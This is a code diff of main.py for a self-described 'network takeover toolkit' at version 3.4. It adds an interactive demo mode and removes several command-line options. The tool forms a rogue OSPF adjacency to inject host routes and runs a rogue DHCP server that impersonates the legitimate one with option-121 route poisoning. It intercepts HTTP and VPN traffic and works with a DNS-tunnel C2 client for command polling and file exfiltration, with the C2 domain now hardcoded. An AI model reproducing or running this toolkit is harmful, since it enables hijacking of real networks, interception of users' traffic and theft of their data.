@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# v3.3
+# v3.4
 """
 main.py — network takeover toolkit entry point.
 
@@ -18,16 +18,11 @@ Orchestrates four modules in /final:
     dns_c2          DNS tunnel C2 client (loaded only when --remote is passed).
 
 Usage:
-    sudo python3 main.py [--remote] [--domain DOMAIN] [--dns-server IP]
-                         [--target IP] [--ospf-timeout SECS]
+    sudo python3 main.py [--remote] [--demo]
 
 Options:
     --remote / -r           Activate DNS tunnel C2 mode.
-    --domain DOMAIN         DNS zone for the C2 channel  (default: d.lootforge.org)
-    --dns-server IP         Resolver for C2 traffic (default: system resolver)
-    --target IP             /32 host route to inject via OSPF (default: stolen
-                            DHCP server IP learned during offer sniffing)
-    --ospf-timeout SECS     Seconds to wait for an OSPF Hello (default: 30)
+    --demo                  Step through each phase interactively (pause + verify hint)
 
 Before running, set DEFAULT_INTERFACE in dhcp_takeover.py to the interface facing
 the target network (default: "eth0").  Root is required for raw sockets, iptables,
@@ -65,17 +60,36 @@ from dhcp_takeover import (
     print_step,
     DEFAULT_INTERFACE,
     IMPERSONATE_REAL_SERVER,
-    pick_client_ip,
     send_dhcpdiscover,
     sniff_dhcpoffer,
-    set_static_address,
     get_interface_ipv4_addresses,
-    wait_for_interface_ipv4_address,
     add_loopback_ipv4_address,
     remove_loopback_ipv4_address,
     build_server_details_from_ospf,
     sniff_for_dhcp_discover_and_request,
 )
+
+
+# ── Demo mode ─────────────────────────────────────────────────────────────────
+
+_demo_mode = False
+
+
+def demo_pause(label: str, hint: str | None = None) -> None:
+    """Print a labelled breakpoint and block until Enter is pressed."""
+    if not _demo_mode:
+        return
+    width = 66
+    bar = "─" * width
+    print(f"\n  ┌{bar}┐")
+    print(f"  │  DEMO  {label}")
+    if hint:
+        print(f"  │  Verify: {hint}")
+    print(f"  └{bar}┘")
+    try:
+        input("  [Enter to continue] ")
+    except (EOFError, KeyboardInterrupt):
+        print()
 
 
 # ── CLI argument parsing ───────────────────────────────────────────────────────
@@ -92,37 +106,9 @@ def _parse_args() -> argparse.Namespace:
         help="Activate DNS tunnel C2 mode (handshake + command polling + file exfil)",
     )
     parser.add_argument(
-        "--domain",
-        default="d.lootforge.org",
-        metavar="DOMAIN",
-        help="DNS zone for the C2 channel",
-    )
-    parser.add_argument(
-        "--dns-server",
-        default=None,
-        metavar="IP",
-        dest="dns_server",
-        help="Resolver for C2 traffic (default: auto-detected system resolver)",
-    )
-    parser.add_argument(
-        "--target",
-        default=None,
-        metavar="IP",
-        help="Host IP for the injected /32 OSPF route (default: stolen DHCP server IP)",
-    )
-    parser.add_argument(
-        "--ospf-timeout",
-        default=30,
-        type=int,
-        metavar="SECS",
-        dest="ospf_timeout",
-        help="Seconds to wait passively for an OSPF Hello before aborting",
-    )
-    parser.add_argument(
-        "--dns",
-        default=None,
-        metavar="IP",
-        help="DNS server to advertise in DHCP leases (default: learned from DHCPOFFER)",
+        "--demo",
+        action="store_true",
+        help="Pause at each phase milestone and print a verification hint before continuing",
     )
     return parser.parse_args()
 
@@ -141,18 +127,19 @@ def _init_c2(args) -> dict | None:
 
     import dns_c2 as _c2
 
-    dns_server = args.dns_server or (_c2.conf.nameservers[0] if _c2.conf.nameservers else "8.8.8.8")
+    domain = "d.lootforge.org"
+    dns_server = _c2.conf.nameservers[0] if _c2.conf.nameservers else "8.8.8.8"
     agent_id = _c2.gen_agent_id()
 
-    print_step("START", f"C2 mode — domain={args.domain}  resolver={dns_server}  agent={agent_id}")
-    if not _c2.perform_handshake(agent_id, args.domain, dns_server):
+    print_step("START", f"C2 mode — domain={domain}  resolver={dns_server}  agent={agent_id}")
+    if not _c2.perform_handshake(agent_id, domain, dns_server):
         print_step("WARN", "C2 handshake failed — continuing without remote mode")
         return None
 
     # Command poll is started later (after OSPF/DHCP setup) so the execute_cb
     # can reference the fully-initialised agent state.
     print_step("OK", "C2 handshake complete — command poll will start after setup")
-    return {"domain": args.domain, "dns_server": dns_server, "agent_id": agent_id}
+    return {"domain": domain, "dns_server": dns_server, "agent_id": agent_id}
 
 
 # ── Debug menu ────────────────────────────────────────────────────────────────
@@ -429,18 +416,17 @@ def _make_remote_cb(c2_config: dict, agent_state: dict):
     return cb
 
 
-def debug_menu(networks: list, proposed_leases: dict, server_details: dict,
-               c2_config: dict | None = None, ospf_hellos: list | None = None,
-               lsdb_subnets: list | None = None,
+def debug_menu(networks: list, c2_config: dict | None = None,
+               ospf_hellos: list | None = None, lsdb_subnets: list | None = None,
                ospf_context: dict | None = None) -> None:
     """
     Interactive debug console.  Runs in a daemon thread while the DHCP sniff
     loop blocks the main thread.
 
-    OSPF (live, from in-process engine):
-      1  SVIs & discovered subnets (Hello-learned + LSDB wire capture)
-      2  Live OSPF neighbours
-      3  Live LSDB (from adjacency engine context)
+    OSPF:
+      1  Network discovery (adjacent SVIs learned from sniffed Hellos)
+      2  Live neighbours        (from adjacency engine LSDB)
+      3  Full LSDB              (from adjacency engine LSDB)
       4  Inject OSPF route (/32 or any stub)
 
     Capture:
@@ -454,9 +440,9 @@ def debug_menu(networks: list, proposed_leases: dict, server_details: dict,
         print("  Debug Console")
         print(sep)
         print("  ── OSPF ──────────────────────────────────────")
-        print("  1)  SVIs & discovered subnets")
-        print("  2)  Live neighbours")
-        print("  3)  Live LSDB")
+        print("  1)  Network discovery      (sniffed Hellos)")
+        print("  2)  Live neighbours        (LSDB)")
+        print("  3)  Full LSDB              (LSDB)")
         print("  4)  Inject route")
         print("  ── Capture ───────────────────────────────────")
         print("  5)  Active leases")
@@ -534,24 +520,23 @@ def setup_and_form_adjacency(interface, ospf_params, target_ip=None, vpn_subnets
     subnet = _ip.IPv4Network(f"{ospf_params['src_ip']}/{netmask}", strict=False)
     svi_ip = ospf_params["src_ip"]
 
-    # ── Step 1: pick / reuse interface IP ────────────────────────────────────
+    # ── Step 1: confirm we already have an IP in the OSPF subnet ────────────
     our_ip = None
     for addr_prefix in get_interface_ipv4_addresses(interface):
         addr = addr_prefix.split("/")[0]
         try:
-            candidate = _ip.IPv4Address(addr)
-            if candidate in subnet and str(candidate) != svi_ip:
+            if _ip.IPv4Address(addr) in subnet and addr != svi_ip:
                 our_ip = addr
-                print_step("OK", f"Reusing existing IP {our_ip} on {interface} (in OSPF subnet {subnet})")
                 break
         except ValueError:
             continue
 
     if our_ip is None:
-        our_ip = pick_client_ip(ospf_params)
-        print_step("START", f"Configuring {our_ip}/{netmask} on {interface}")
-        set_static_address(interface, our_ip, netmask)
-        wait_for_interface_ipv4_address(interface, expected_address=our_ip)
+        raise RuntimeError(
+            f"No IP in OSPF subnet {subnet} found on {interface} — "
+            "ensure the interface has a DHCP lease before running."
+        )
+    print_step("OK", f"Using existing IP {our_ip} on {interface} (subnet {subnet})")
 
     # ── Step 2: concurrent DHCPDISCOVER + sniffer ─────────────────────────────
     # Start the sniffer first, then send — avoids the race where the offer
@@ -567,6 +552,14 @@ def setup_and_form_adjacency(interface, ospf_params, target_ip=None, vpn_subnets
     send_dhcpdiscover(interface)
     sniff_thread.join()
     offer = offer_result[0]
+
+    if offer:
+        demo_pause(
+            f"DHCP server discovered: {offer.get('server_id')} offered {offer.get('your_ip')} to us",
+            hint="tcpdump -i eth0 'udp port 67 or udp port 68'   or   show ip dhcp binding (on router)",
+        )
+    else:
+        demo_pause("DHCPDISCOVER sent — no OFFER received (proceeding without target DHCP server)")
 
     # ── Step 3: default route via SVI ─────────────────────────────────────────
     default_route_added = ospf_adjacency.add_default_route(svi_ip, interface)
@@ -619,6 +612,10 @@ def setup_and_form_adjacency(interface, ospf_params, target_ip=None, vpn_subnets
         print_step("FAIL", "OSPF FULL adjacency not reached within 300s")
         raise TimeoutError(f"OSPF adjacency timeout on {interface}")
     print_step("OK", "OSPF FULL adjacency reached")
+    demo_pause(
+        f"OSPF FULL adjacency formed — /32 host route for {route_ip} injected into topology",
+        hint="show ip route ospf (on router)   or   ip route show (attacker)",
+    )
 
     return interface, our_ip, offer, dhcp_server_ip, lsdb_subnets, default_route_added, context
 
@@ -644,20 +641,31 @@ def start_http_intercept(sniff_iface, our_ips=None):
 # ── Entry point ───────────────────────────────────────────────────────────────
 
 def main():
-    print("Network Takeover Toolkit v3.3 — Starting...")
+    print("Network Takeover Toolkit v3.4 — Starting...")
     args = _parse_args()
     interface = DEFAULT_INTERFACE  # set in dhcp_takeover.py
+
+    global _demo_mode
+    _demo_mode = args.demo
+    if _demo_mode:
+        print("  [demo mode] Execution will pause at each phase milestone.")
 
     # ── C2 handshake (before any network activity so operator confirms aliveness)
     c2_config = _init_c2(args)
 
     # ── Phase 1: passive OSPF Hello sniffing to learn SVI parameters ─────────
-    print_step("START", f"Passive OSPF Hello sniff on {interface} (timeout={args.ospf_timeout}s)")
-    ospf_hellos = ospf_adjacency.sniff_ospf_hellos(interface, timeout=args.ospf_timeout)
+    print_step("START", f"Passive OSPF Hello sniff on {interface} (timeout=30s)")
+    ospf_hellos = ospf_adjacency.sniff_ospf_hellos(interface, timeout=30)
     if not ospf_hellos:
         print_step("FAIL", "No OSPF Hellos received — cannot learn SVI parameters. Aborting.")
         return
     ospf_params = ospf_hellos[0]  # use first SVI for adjacency
+    demo_pause(
+        f"OSPF Hello received — SVI {ospf_params['src_ip']} "
+        f"area={ospf_params['area_id']}  hello={ospf_params['hello_interval']}s  "
+        f"dead={ospf_params['dead_interval']}s  mask={ospf_params['netmask']}",
+        hint="tcpdump -i eth0 proto ospf   or   show ip ospf neighbor (on router)",
+    )
 
     # Enable IP forwarding early; save old value for teardown.
     saved_ip_forward = ospf_adjacency.enable_ip_forwarding()
@@ -680,7 +688,7 @@ def main():
 
         # ── Phase 3: configure IP, untagged discover, OSPF adjacency ──────────
         ospf_interface, our_ip, offer, loopback_alias_ip, lsdb_subnets, default_route_added, ospf_context = setup_and_form_adjacency(
-            interface, ospf_params, target_ip=args.target, vpn_subnets=vpn_subnets,
+            interface, ospf_params, vpn_subnets=vpn_subnets,
         )
         ospf_iface_for_fwd = ospf_interface
 
@@ -695,8 +703,7 @@ def main():
         server_identity = loopback_alias_ip or our_ip
         server_details = build_server_details_from_ospf(
             ospf_interface, ospf_params, server_identity,
-            relay_ip=our_ip,   # ARP-resolvable interface IP for option 121 next-hop
-            offer=offer, dns=getattr(args, "dns", None),
+            offer=offer,
         )
 
         # Pass pre-detected tun/subnet so enable_vpn_relay skips re-detection.
@@ -712,8 +719,18 @@ def main():
             tun_iface=tun_iface,
             vpn_subnets=vpn_subnets if tun_iface else None,
         )
+        demo_pause(
+            "iptables MASQUERADE + IP forwarding + policy routing table installed",
+            hint="iptables -t nat -L -n -v   and   ip rule show; ip route show table 100",
+        )
 
         # ── Phase 6: HTTP interception on the traffic we now carry ───────────
+        demo_pause(
+            f"VPN relay {'active on ' + tun_iface if tun_iface else 'not available — passthrough mode'}"
+            f" — option-121 DHCP poison armed"
+            f" (next-hop={server_details.get('relay_ip', our_ip)})",
+            hint="ip link show tun0   or   ip route show dev tun0",
+        )
         # Prefer the tunnel (plaintext VPN traffic); fall back to the physical
         # interface when there is no VPN relay.
         our_ips = {our_ip}
@@ -746,13 +763,16 @@ def main():
         else:
             threading.Thread(
                 target=debug_menu,
-                args=(networks, proposed_leases, server_details, None,
-                      ospf_hellos, lsdb_subnets, ospf_context),
+                args=(networks, None, ospf_hellos, lsdb_subnets, ospf_context),
                 daemon=True,
                 name="debug-menu",
             ).start()
 
         # ── Phase 7: rogue DHCP server (blocking) ────────────────────────────
+        demo_pause(
+            f"Rogue DHCP server ready to start — will answer victim DISCOVER/REQUEST as {server_details.get('source_ip', our_ip)}",
+            hint="tcpdump -i eth0 'udp port 67 or udp port 68'   and watch for OFFER from our IP",
+        )
         relay_mode = (
             f"VPN relay via {tun_iface} → {server_details.get('opt121_subnets')}"
             if tun_iface else "passthrough only"
